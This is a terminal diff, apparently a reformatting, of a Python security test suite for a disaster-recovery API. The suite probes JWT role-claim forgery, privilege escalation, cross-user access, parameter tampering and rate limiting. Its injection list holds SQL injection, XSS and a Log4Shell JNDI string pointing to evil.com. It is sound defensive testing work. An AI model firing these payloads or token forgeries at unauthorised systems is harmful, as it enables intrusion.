endpoint:\u001b[0m\n                     test_data = {\n\u001b[31m-                        'name': 'Test Group',\u001b[0m\n\u001b[31m-                        'region': 'us-east-1',\u001b[0m\n\u001b[31m-                        'servers': []\u001b[0m\n\u001b[32m+                        \"name\": \"Test Group\",\u001b[0m\n\u001b[32m+                        \"region\": \"us-east-1\",\u001b[0m\n\u001b[32m+                        \"servers\": [],\u001b[0m\n                     }\n\u001b[31m-                elif 'recovery-plans' in endpoint:\u001b[0m\n\u001b[32m+                elif \"recovery-plans\" in endpoint:\u001b[0m\n\u001b[32m+                    test_data = {\"name\": \"Test Plan\", \"waves\": []}\u001b[0m\n\u001b[32m+                elif \"executions\" in endpoint:\u001b[0m\n                     test_data = {\n\u001b[31m-                        'name': 'Test Plan',\u001b[0m\n\u001b[31m-                        'waves': []\u001b[0m\n\u001b[32m+                        \"recoveryPlanId\": \"test-plan\",\u001b[0m\n\u001b[32m+                        \"executionType\": \"DRILL\",\u001b[0m\n                     }\n\u001b[31m-                elif 'executions' in endpoint:\u001b[0m\n\u001b[31m-                    test_data = {\u001b[0m\n\u001b[31m-                        'recoveryPlanId': 'test-plan',\u001b[0m\n\u001b[31m-                        'executionType': 'DRILL'\u001b[0m\n\u001b[31m-                    }\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Make API request\n             url = f\"{self.api_base_url}{endpoint}\"\n\u001b[31m-            \u001b[0m\n\u001b[31m-            if method == 'GET':\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+            if method == \"GET\":\u001b[0m\n                 response = requests.get(url, headers=headers, timeout=10)\n\u001b[31m-            elif method == 'POST':\u001b[0m\n\u001b[31m-                response = requests.post(url, headers=headers, json=test_data, timeout=10)\u001b[0m\n\u001b[31m-            elif method == 'PUT':\u001b[0m\n\u001b[31m-                response = requests.put(url, headers=headers, json=test_data, timeout=10)\u001b[0m\n\u001b[31m-            elif method == 'DELETE':\u001b[0m\n\u001b[32m+            elif method == \"POST\":\u001b[0m\n\u001b[32m+                response = requests.post(\u001b[0m\n\u001b[32m+                    url, headers=headers, json=test_data, timeout=10\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+            elif method == \"PUT\":\u001b[0m\n\u001b[32m+                response = requests.put(\u001b[0m\n\u001b[32m+                    url, headers=headers, json=test_data, timeout=10\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+            elif method == \"DELETE\":\u001b[0m\n                 response = requests.delete(url, headers=headers, timeout=10)\n             else:\n                 return False\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Check if access was granted (not 401/403)\n             return response.status_code not in [401, 403]\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n         except Exception as e:\n             logger.error(f\"Error testing permission {permission}: {str(e)}\")\n             return False\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     async def _run_privilege_escalation_tests(self):\n         \"\"\"Test for privilege escalation vulnerabilities\"\"\"\n         logger.info(\"Running privilege escalation tests...\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Test JWT token manipulation\n         await self._test_jwt_manipulation()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Test role modification attempts\n         await self._test_role_modification()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Test cross-user access\n         await self._test_cross_user_access()\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     async def _test_jwt_manipulation(self):\n         \"\"\"Test JWT token manipulation for privilege escalation\"\"\"\n         test_id = \"PET-001\"\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         try:\n             # Get a low-privilege user token\n             readonly_user = self.test_users.get(\"aws:read-only\")\n             if not readonly_user or not readonly_user.token:\n                 return\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Decode token (without verification for testing)\n\u001b[31m-            decoded_token = jwt.decode(readonly_user.token, options={\"verify_signature\": False})\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+            decoded_token = jwt.decode(\u001b[0m\n\u001b[32m+                readonly_user.token, options={\"verify_signature\": False}\u001b[0m\n\u001b[32m+            )\u001b[0m\n\u001b[32m+\u001b[0m\n             # Attempt to modify role claim\n             modified_token = decoded_token.copy()\n\u001b[31m-            modified_token['custom:role'] = 'aws:admin'\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+            modified_token[\"custom:role\"] = \"aws:admin\"\u001b[0m\n\u001b[32m+\u001b[0m\n             # Try to use modified token (this should fail due to signature verification)\n             headers = {\n\u001b[31m-                'Authorization': f'Bearer {jwt.encode(modified_token, \"fake-secret\", algorithm=\"HS256\")}',\u001b[0m\n\u001b[31m-                'Content-Type': 'application/json'\u001b[0m\n\u001b[32m+                \"Authorization\": f'Bearer {jwt.encode(modified_token, \"fake-secret\", algorithm=\"HS256\")}',\u001b[0m\n\u001b[32m+                \"Content-Type\": \"application/json\",\u001b[0m\n             }\n\u001b[31m-            \u001b[0m\n\u001b[31m-            response = requests.get(f\"{self.api_base_url}/users\", headers=headers, timeout=10)\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+            response = requests.get(\u001b[0m\n\u001b[32m+                f\"{self.api_base_url}/users\", headers=headers, timeout=10\u001b[0m\n\u001b[32m+            )\u001b[0m\n\u001b[32m+\u001b[0m\n             if response.status_code == 200:\n                 # Token manipulation succeeded - critical security issue\n\u001b[31m-                self.findings.append(SecurityFinding(\u001b[0m\n\u001b[31m-                    test_id=test_id,\u001b[0m\n\u001b[31m-                    title=\"JWT Token Manipulation Vulnerability\",\u001b[0m\n\u001b[31m-                    description=\"Modified JWT tokens are being accepted, allowing privilege escalation\",\u001b[0m\n\u001b[31m-                    risk_level=RiskLevel.CRITICAL,\u001b[0m\n\u001b[31m-                    status=TestStatus.FAIL,\u001b[0m\n\u001b[31m-                    details={\"original_role\": \"aws:read-only\", \"modified_role\": \"aws:admin\"},\u001b[0m\n\u001b[31m-                    remediation=\"Implement proper JWT signature verification and token validation\",\u001b[0m\n\u001b[31m-                    affected_roles=[\"all\"],\u001b[0m\n\u001b[31m-                    timestamp=datetime.datetime.utcnow().isoformat()\u001b[0m\n\u001b[31m-                ))\u001b[0m\n\u001b[32m+                self.findings.append(\u001b[0m\n\u001b[32m+                    SecurityFinding(\u001b[0m\n\u001b[32m+                        test_id=test_id,\u001b[0m\n\u001b[32m+                        title=\"JWT Token Manipulation Vulnerability\",\u001b[0m\n\u001b[32m+                        description=\"Modified JWT tokens are being accepted, allowing privilege escalation\",\u001b[0m\n\u001b[32m+                        risk_level=RiskLevel.CRITICAL,\u001b[0m\n\u001b[32m+                        status=TestStatus.FAIL,\u001b[0m\n\u001b[32m+                        details={\u001b[0m\n\u001b[32m+                            \"original_role\": \"aws:read-only\",\u001b[0m\n\u001b[32m+                            \"modified_role\": \"aws:admin\",\u001b[0m\n\u001b[32m+                        },\u001b[0m\n\u001b[32m+                        remediation=\"Implement proper JWT signature verification and token validation\",\u001b[0m\n\u001b[32m+                        affected_roles=[\"all\"],\u001b[0m\n\u001b[32m+                        timestamp=datetime.datetime.utcnow().isoformat(),\u001b[0m\n\u001b[32m+                    )\u001b[0m\n\u001b[32m+                )\u001b[0m\n             else:\n\u001b[31m-                logger.debug(\"JWT manipulation test passed - modified tokens rejected\")\u001b[0m\n\u001b[31m-                \u001b[0m\n\u001b[32m+                logger.debug(\u001b[0m\n\u001b[32m+                    \"JWT manipulation test passed - modified tokens rejected\"\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+\u001b[0m\n         except Exception as e:\n             logger.error(f\"Error in JWT manipulation test: {str(e)}\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     async def _test_role_modification(self):\n         \"\"\"Test attempts to modify own role\"\"\"\n         test_id = \"PET-002\"\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         try:\n             # Test with each user trying to modify their own role\n             for role, user in self.test_users.items():\n                 if role == \"aws:admin\":  # Skip admin as they can modify roles\n                     continue\n\u001b[31m-                \u001b[0m\n\u001b[32m+\u001b[0m\n                 headers = {\n\u001b[31m-                    'Authorization': f'Bearer {user.token}',\u001b[0m\n\u001b[31m-                    'Content-Type': 'application/json'\u001b[0m\n\u001b[32m+                    \"Authorization\": f\"Bearer {user.token}\",\u001b[0m\n\u001b[32m+                    \"Content-Type\": \"application/json\",\u001b[0m\n                 }\n\u001b[31m-                \u001b[0m\n\u001b[32m+\u001b[0m\n                 # Attempt to modify own role to admin\n\u001b[31m-                data = {\u001b[0m\n\u001b[31m-                    'role': 'aws:admin'\u001b[0m\n\u001b[31m-                }\u001b[0m\n\u001b[31m-                \u001b[0m\n\u001b[32m+                data = {\"role\": \"aws:admin\"}\u001b[0m\n\u001b[32m+\u001b[0m\n                 response = requests.put(\n                     f\"{self.api_base_url}/users/{user.user_id}\",\n                     headers=headers,\n                     json=data,\n\u001b[31m-                    timeout=10\u001b[0m\n\u001b[31m-                )\u001b[0m\n\u001b[31m-                \u001b[0m\n\u001b[32m+                    timeout=10,\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+\u001b[0m\n                 if response.status_code == 200:\n                     # Role modification succeeded - security issue\n\u001b[31m-                    self.findings.append(SecurityFinding(\u001b[0m\n\u001b[31m-                        test_id=f\"{test_id}-{role}\",\u001b[0m\n\u001b[31m-                        title=\"Self Role Modification Vulnerability\",\u001b[0m\n\u001b[31m-                        description=f\"User with role {role} was able to modify their own role\",\u001b[0m\n\u001b[31m-                        risk_level=RiskLevel.HIGH,\u001b[0m\n\u001b[31m-                        status=TestStatus.FAIL,\u001b[0m\n\u001b[31m-                        details={\"original_role\": role, \"attempted_role\": \"aws:admin\"},\u001b[0m\n\u001b[31m-                        remediation=\"Prevent users from modifying their own roles\",\u001b[0m\n\u001b[31m-                        affected_roles=[role],\u001b[0m\n\u001b[31m-                        timestamp=datetime.datetime.utcnow().isoformat()\u001b[0m\n\u001b[31m-                    ))\u001b[0m\n\u001b[31m-                    \u001b[0m\n\u001b[32m+                    self.findings.append(\u001b[0m\n\u001b[32m+                        SecurityFinding(\u001b[0m\n\u001b[32m+                            test_id=f\"{test_id}-{role}\",\u001b[0m\n\u001b[32m+                            title=\"Self Role Modification Vulnerability\",\u001b[0m\n\u001b[32m+                            description=f\"User with role {role} was able to modify their own role\",\u001b[0m\n\u001b[32m+                            risk_level=RiskLevel.HIGH,\u001b[0m\n\u001b[32m+                            status=TestStatus.FAIL,\u001b[0m\n\u001b[32m+                            details={\u001b[0m\n\u001b[32m+                                \"original_role\": role,\u001b[0m\n\u001b[32m+                                \"attempted_role\": \"aws:admin\",\u001b[0m\n\u001b[32m+                            },\u001b[0m\n\u001b[32m+                            remediation=\"Prevent users from modifying their own roles\",\u001b[0m\n\u001b[32m+                            affected_roles=[role],\u001b[0m\n\u001b[32m+                            timestamp=datetime.datetime.utcnow().isoformat(),\u001b[0m\n\u001b[32m+                        )\u001b[0m\n\u001b[32m+                    )\u001b[0m\n\u001b[32m+\u001b[0m\n         except Exception as e:\n             logger.error(f\"Error in role modification test: {str(e)}\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     async def _test_cross_user_access(self):\n         \"\"\"Test cross-user data access\"\"\"\n         test_id = \"PET-003\"\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         try:\n             # Test if users can access other users' data\n             readonly_user = self.test_users.get(\"aws:read-only\")\n             admin_user = self.test_users.get(\"aws:admin\")\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             if not readonly_user or not admin_user:\n                 return\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             headers = {\n\u001b[31m-                'Authorization': f'Bearer {readonly_user.token}',\u001b[0m\n\u001b[31m-                'Content-Type': 'application/json'\u001b[0m\n\u001b[32m+                \"Authorization\": f\"Bearer {readonly_user.token}\",\u001b[0m\n\u001b[32m+                \"Content-Type\": \"application/json\",\u001b[0m\n             }\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Try to access admin user's data\n             response = requests.get(\n                 f\"{self.api_base_url}/users/{admin_user.user_id}\",\n                 headers=headers,\n\u001b[31m-                timeout=10\u001b[0m\n\u001b[32m+                timeout=10,\u001b[0m\n             )\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             if response.status_code == 200:\n                 # Cross-user access succeeded - potential issue\n\u001b[31m-                self.findings.append(SecurityFinding(\u001b[0m\n\u001b[31m-                    test_id=test_id,\u001b[0m\n\u001b[31m-                    title=\"Cross-User Data Access\",\u001b[0m\n\u001b[31m-                    description=\"Read-only user was able to access admin user data\",\u001b[0m\n\u001b[31m-                    risk_level=RiskLevel.MEDIUM,\u001b[0m\n\u001b[31m-                    status=TestStatus.FAIL,\u001b[0m\n\u001b[31m-                    details={\"accessing_user\": readonly_user.username, \"target_user\": admin_user.username},\u001b[0m\n\u001b[31m-                    remediation=\"Implement proper user data access controls\",\u001b[0m\n\u001b[31m-                    affected_roles=[\"aws:read-only\"],\u001b[0m\n\u001b[31m-                    timestamp=datetime.datetime.utcnow().isoformat()\u001b[0m\n\u001b[31m-                ))\u001b[0m\n\u001b[31m-                \u001b[0m\n\u001b[32m+                self.findings.append(\u001b[0m\n\u001b[32m+                    SecurityFinding(\u001b[0m\n\u001b[32m+                        test_id=test_id,\u001b[0m\n\u001b[32m+                        title=\"Cross-User Data Access\",\u001b[0m\n\u001b[32m+                        description=\"Read-only user was able to access admin user data\",\u001b[0m\n\u001b[32m+                        risk_level=RiskLevel.MEDIUM,\u001b[0m\n\u001b[32m+                        status=TestStatus.FAIL,\u001b[0m\n\u001b[32m+                        details={\u001b[0m\n\u001b[32m+                            \"accessing_user\": readonly_user.username,\u001b[0m\n\u001b[32m+                            \"target_user\": admin_user.username,\u001b[0m\n\u001b[32m+                        },\u001b[0m\n\u001b[32m+                        remediation=\"Implement proper user data access controls\",\u001b[0m\n\u001b[32m+                        affected_roles=[\"aws:read-only\"],\u001b[0m\n\u001b[32m+                        timestamp=datetime.datetime.utcnow().isoformat(),\u001b[0m\n\u001b[32m+                    )\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+\u001b[0m\n         except Exception as e:\n             logger.error(f\"Error in cross-user access test: {str(e)}\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     async def _run_api_security_tests(self):\n         \"\"\"Test API security controls\"\"\"\n         logger.info(\"Running API security tests...\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Test for common API vulnerabilities\n         await self._test_parameter_tampering()\n         await self._test_injection_attacks()\n         await self._test_rate_limiting()\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     async def _test_parameter_tampering(self):\n         \"\"\"Test parameter tampering attacks\"\"\"\n         test_id = \"AST-001\"\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         try:\n             readonly_user = self.test_users.get(\"aws:read-only\")\n             if not readonly_user:\n                 return\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             headers = {\n\u001b[31m-                'Authorization': f'Bearer {readonly_user.token}',\u001b[0m\n\u001b[31m-                'Content-Type': 'application/json'\u001b[0m\n\u001b[32m+                \"Authorization\": f\"Bearer {readonly_user.token}\",\u001b[0m\n\u001b[32m+                \"Content-Type\": \"application/json\",\u001b[0m\n             }\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Test various parameter tampering attempts\n             tampering_tests = [\n                 # Try to access admin endpoints by parameter manipulation\n                 {\"url\": \"/accounts/targets\", \"params\": {\"admin\": \"true\"}},\n                 {\"url\": \"/protection-groups\", \"params\": {\"role\": \"admin\"}},\n                 {\"url\": \"/recovery-plans\", \"params\": {\"bypass_auth\": \"true\"}},\n             ]\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             for test in tampering_tests:\n                 response = requests.get(\n                     f\"{self.api_base_url}{test['url']}\",\n                     headers=headers,\n\u001b[31m-                    params=test.get('params', {}),\u001b[0m\n\u001b[31m-                    timeout=10\u001b[0m\n\u001b[31m-                )\u001b[0m\n\u001b[31m-                \u001b[0m\n\u001b[32m+                    params=test.get(\"params\", {}),\u001b[0m\n\u001b[32m+                    timeout=10,\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+\u001b[0m\n                 # Check if tampering revealed unauthorized data\n\u001b[31m-                if response.status_code == 200 and 'admin' in response.text.lower():\u001b[0m\n\u001b[31m-                    self.findings.append(SecurityFinding(\u001b[0m\n\u001b[31m-                        test_id=f\"{test_id}-{test['url']}\",\u001b[0m\n\u001b[31m-                        title=\"Parameter Tampering Vulnerability\",\u001b[0m\n\u001b[31m-                        description=f\"Parameter tampering on {test['url']} revealed unauthorized data\",\u001b[0m\n\u001b[31m-                        risk_level=RiskLevel.HIGH,\u001b[0m\n\u001b[31m-                        status=TestStatus.FAIL,\u001b[0m\n\u001b[31m-                        details={\"endpoint\": test['url'], \"parameters\": test.get('params', {})},\u001b[0m\n\u001b[31m-                        remediation=\"Implement server-side parameter validation\",\u001b[0m\n\u001b[31m-                        affected_roles=[\"aws:read-only\"],\u001b[0m\n\u001b[31m-                        timestamp=datetime.datetime.utcnow().isoformat()\u001b[0m\n\u001b[31m-                    ))\u001b[0m\n\u001b[31m-                    \u001b[0m\n\u001b[32m+                if (\u001b[0m\n\u001b[32m+                    response.status_code == 200\u001b[0m\n\u001b[32m+                    and \"admin\" in response.text.lower()\u001b[0m\n\u001b[32m+                ):\u001b[0m\n\u001b[32m+                    self.findings.append(\u001b[0m\n\u001b[32m+                        SecurityFinding(\u001b[0m\n\u001b[32m+                            test_id=f\"{test_id}-{test['url']}\",\u001b[0m\n\u001b[32m+                            title=\"Parameter Tampering Vulnerability\",\u001b[0m\n\u001b[32m+                            description=f\"Parameter tampering on {test['url']} revealed unauthorized data\",\u001b[0m\n\u001b[32m+                            risk_level=RiskLevel.HIGH,\u001b[0m\n\u001b[32m+                            status=TestStatus.FAIL,\u001b[0m\n\u001b[32m+                            details={\u001b[0m\n\u001b[32m+                                \"endpoint\": test[\"url\"],\u001b[0m\n\u001b[32m+                                \"parameters\": test.get(\"params\", {}),\u001b[0m\n\u001b[32m+                            },\u001b[0m\n\u001b[32m+                            remediation=\"Implement server-side parameter validation\",\u001b[0m\n\u001b[32m+                            affected_roles=[\"aws:read-only\"],\u001b[0m\n\u001b[32m+                            timestamp=datetime.datetime.utcnow().isoformat(),\u001b[0m\n\u001b[32m+                        )\u001b[0m\n\u001b[32m+                    )\u001b[0m\n\u001b[32m+\u001b[0m\n         except Exception as e:\n             logger.error(f\"Error in parameter tampering test: {str(e)}\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     async def _test_injection_attacks(self):\n         \"\"\"Test for injection vulnerabilities\"\"\"\n         test_id = \"AST-002\"\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         try:\n             readonly_user = self.test_users.get(\"aws:read-only\")\n             if not readonly_user:\n                 return\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             headers = {\n\u001b[31m-                'Authorization': f'Bearer {readonly_user.token}',\u001b[0m\n\u001b[31m-                'Content-Type': 'application/json'\u001b[0m\n\u001b[32m+                \"Authorization\": f\"Bearer {readonly_user.token}\",\u001b[0m\n\u001b[32m+                \"Content-Type\": \"application/json\",\u001b[0m\n             }\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Test SQL injection patterns\n             injection_payloads = [\n                 \"'; DROP TABLE users; --\",\n                 \"' OR '1'='1\",\n                 \"admin'--\",\n                 \"<script>alert('xss')</script>\",\n\u001b[31m-                \"${jndi:ldap://evil.com/a}\"\u001b[0m\n\u001b[32m+                \"${jndi:ldap://evil.com/a}\",\u001b[0m\n             ]\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             for payload in injection_payloads:\n                 # Test in search parameters\n                 response = requests.get(\n                     f\"{self.api_base_url}/protection-groups\",\n                     headers=headers,\n                     params={\"search\": payload},\n\u001b[31m-                    timeout=10\u001b[0m\n\u001b[31m-                )\u001b[0m\n\u001b[31m-                \u001b[0m\n\u001b[32m+                    timeout=10,\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+\u001b[0m\n                 # Check for signs of successful injection\n\u001b[31m-                if any(indicator in response.text.lower() for indicator in ['error', 'exception', 'sql', 'database']):\u001b[0m\n\u001b[31m-                    self.findings.append(SecurityFinding(\u001b[0m\n\u001b[31m-                        test_id=f\"{test_id}-injection\",\u001b[0m\n\u001b[31m-                        title=\"Potential Injection Vulnerability\",\u001b[0m\n\u001b[31m-                        description=f\"Injection payload '{payload}' caused error response\",\u001b[0m\n\u001b[31m-                        risk_level=RiskLevel.HIGH,\u001b[0m\n\u001b[31m-                        status=TestStatus.FAIL,\u001b[0m\n\u001b[31m-                        details={\"payload\": payload, \"response_snippet\": response.text[:200]},\u001b[0m\n\u001b[31m-                        remediation=\"Implement input validation and parameterized queries\",\u001b[0m\n\u001b[31m-                        affected_roles=[\"all\"],\u001b[0m\n\u001b[31m-                        timestamp=datetime.datetime.utcnow().isoformat()\u001b[0m\n\u001b[31m-                    ))\u001b[0m\n\u001b[31m-                    \u001b[0m\n\u001b[32m+                if any(\u001b[0m\n\u001b[32m+                    indicator in response.text.lower()\u001b[0m\n\u001b[32m+                    for indicator in [\"error\", \"exception\", \"sql\", \"database\"]\u001b[0m\n\u001b[32m+                ):\u001b[0m\n\u001b[32m+                    self.findings.append(\u001b[0m\n\u001b[32m+                        SecurityFinding(\u001b[0m\n\u001b[32m+                            test_id=f\"{test_id}-injection\",\u001b[0m\n\u001b[32m+                            title=\"Potential Injection Vulnerability\",\u001b[0m\n\u001b[32m+                            description=f\"Injection payload '{payload}' caused error response\",\u001b[0m\n\u001b[32m+                            risk_level=RiskLevel.HIGH,\u001b[0m\n\u001b[32m+                            status=TestStatus.FAIL,\u001b[0m\n\u001b[32m+                            details={\u001b[0m\n\u001b[32m+                                \"payload\": payload,\u001b[0m\n\u001b[32m+                                \"response_snippet\": response.text[:200],\u001b[0m\n\u001b[32m+                            },\u001b[0m\n\u001b[32m+                            remediation=\"Implement input validation and parameterized queries\",\u001b[0m\n\u001b[32m+                            affected_roles=[\"all\"],\u001b[0m\n\u001b[32m+                            timestamp=datetime.datetime.utcnow().isoformat(),\u001b[0m\n\u001b[32m+                        )\u001b[0m\n\u001b[32m+                    )\u001b[0m\n\u001b[32m+\u001b[0m\n         except Exception as e:\n             logger.error(f\"Error in injection attack test: {str(e)}\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     async def _test_rate_limiting(self):\n         \"\"\"Test rate limiting controls\"\"\"\n         test_id = \"AST-003\"\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         try:\n             readonly_user = self.test_users.get(\"aws:read-only\")\n             if not readonly_user:\n                 return\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             headers = {\n\u001b[31m-                'Authorization': f'Bearer {readonly_user.token}',\u001b[0m\n\u001b[31m-                'Content-Type': 'application/json'\u001b[0m\n\u001b[32m+                \"Authorization\": f\"Bearer {readonly_user.token}\",\u001b[0m\n\u001b[32m+                \"Content-Type\": \"application/json\",\u001b[0m\n             }\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Make rapid requests to test rate limiting\n             responses = []\n             for i in range(100):  # Make 100 rapid requests\n                 try:\n                     response = requests.get(\n                         f\"{self.api_base_url}/protection-groups\",\n                         headers=headers,\n\u001b[31m-                        timeout=5\u001b[0m\n\u001b[32m+                        timeout=5,\u001b[0m\n                     )\n                     responses.append(response.status_code)\n                 except:\n                     responses.append(0)  # Timeout or error\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Check if any rate limiting occurred\n             rate_limited = any(code == 429 for code in responses)\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             if not rate_limited:\n\u001b[31m-                self.findings.append(SecurityFinding(\u001b[0m\n\u001b[31m-                    test_id=test_id,\u001b[0m\n\u001b[31m-                    title=\"Missing Rate Limiting\",\u001b[0m\n\u001b[31m-                    description=\"No rate limiting detected after 100 rapid requests\",\u001b[0m\n\u001b[31m-                    risk_level=RiskLevel.MEDIUM,\u001b[0m\n\u001b[31m-                    status=TestStatus.FAIL,\u001b[0m\n\u001b[31m-                    details={\"requests_made\": 100, \"rate_limited\": False},\u001b[0m\n\u001b[31m-                    remediation=\"Implement API rate limiting to prevent abuse\",\u001b[0m\n\u001b[31m-                    affected_roles=[\"all\"],\u001b[0m\n\u001b[31m-                    timestamp=datetime.datetime.utcnow().isoformat()\u001b[0m\n\u001b[31m-                ))\u001b[0m\n\u001b[31m-                \u001b[0m\n\u001b[32m+                self.findings.append(\u001b[0m\n\u001b[32m+                    SecurityFinding(\u001b[0m\n\u001b[32m+                        test_id=test_id,\u001b[0m\n\u001b[32m+                        title=\"Missing Rate Limiting\",\u001b[0m\n\u001b[32m+                        description=\"No rate limiting detected after 100 rapid requests\",\u001b[0m\n\u001b[32m+                        risk_level=RiskLevel.MEDIUM,\u001b[0m\n\u001b[32m+                        status=TestStatus.FAIL,\u001b[0m\n\u001b[32m+                        details={\"requests_made\": 100, \"rate_limited\": False},\u001b[0m\n\u001b[32m+                        remediation=\"Implement API rate limiting to prevent abuse\",\u001b[0m\n\u001b[32m+                        affected_roles=[\"all\"],\u001b[0m\n\u001b[32m+                        timestamp=datetime.datetime.utcnow().isoformat(),\u001b[0m\n\u001b[32m+                    )\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+\u001b[0m\n         except Exception as e:\n             logger.error(f\"Error in rate limiting test: {str(e)}\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     async def _run_data_access_tests(self):\n         \"\"\"Test data access controls\"\"\"\n         logger.info(\"Running data access control tests...\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Test cross-account data access\n         await self._test_cross_account_access()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Test data leakage in responses\n         await self._test_data_leakage()\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     async def _test_cross_account_access(self):\n         \"\"\"Test cross-account data access controls\"\"\"\n         test_id = \"DAC-001\"\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         try:\n             # This would require setting up test accounts\n             # For now, we'll simulate the test\n\u001b[31m-            logger.info(\"Cross-account access test would require test account setup\")\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+            logger.info(\u001b[0m\n\u001b[32m+                \"Cross-account access test would require test account setup\"\u001b[0m\n\u001b[32m+            )\u001b[0m\n\u001b[32m+\u001b[0m\n         except Exception as e:\n             logger.error(f\"Error in cross-account access test: {str(e)}\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     async def _test_data_leakage(self):\n         \"\"\"Test for sensitive data leakage in API responses\"\"\"\n         test_id = \"DAC-002\"\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         try:\n             readonly_user = self.test_users.get(\"aws:read-only\")\n             if not readonly_user:\n                 return\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             headers = {\n\u001b[31m-                'Authorization': f'Bearer {readonly_user.token}',\u001b[0m\n\u001b[31m-                'Content-Type': 'application/json'\u001b[0m\n\u001b[32m+                \"Authorization\": f\"Bearer {readonly_user.token}\",\u001b[0m\n\u001b[32m+                \"Content-Type\": \"application/json\",\u001b[0m\n             }\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Test various endpoints for data leakage\n\u001b[31m-            endpoints = [\"/accounts/targets\", \"/protection-groups\", \"/recovery-plans\", \"/executions\"]\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+            endpoints = [\u001b[0m\n\u001b[32m+                \"/accounts/targets\",\u001b[0m\n\u001b[32m+                \"/protection-groups\",\u001b[0m\n\u001b[32m+                \"/recovery-plans\",\u001b[0m\n\u001b[32m+                \"/executions\",\u001b[0m\n\u001b[32m+            ]\u001b[0m\n\u001b[32m+\u001b[0m\n             for endpoint in endpoints:\n                 response = requests.get(\n                     f\"{self.api_base_url}{endpoint}\",\n                     headers=headers,\n\u001b[31m-                    timeout=10\u001b[0m\n\u001b[31m-                )\u001b[0m\n\u001b[31m-                \u001b[0m\n\u001b[32m+                    timeout=10,\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+\u001b[0m\n                 if response.status_code == 200:\n                     # Check for sensitive data patterns\n                     sensitive_patterns = [\n\u001b[31m-                        r'password',\u001b[0m\n\u001b[31m-                        r'secret',\u001b[0m\n\u001b[31m-                        r'key',\u001b[0m\n\u001b[31m-                        r'token',\u001b[0m\n\u001b[31m-                        r'arn:aws:iam::\\d+:role/',\u001b[0m\n\u001b[31m-                        r'\\d{12}'  # AWS account IDs\u001b[0m\n\u001b[32m+                        r\"password\",\u001b[0m\n\u001b[32m+                        r\"secret\",\u001b[0m\n\u001b[32m+                        r\"key\",\u001b[0m\n\u001b[32m+                        r\"token\",\u001b[0m\n\u001b[32m+                        r\"arn:aws:iam::\\d+:role/\",\u001b[0m\n\u001b[32m+                        r\"\\d{12}\",  # AWS account IDs\u001b[0m\n                     ]\n\u001b[31m-                    \u001b[0m\n\u001b[32m+\u001b[0m\n                     import re\n\u001b[32m+\u001b[0m\n                     for pattern 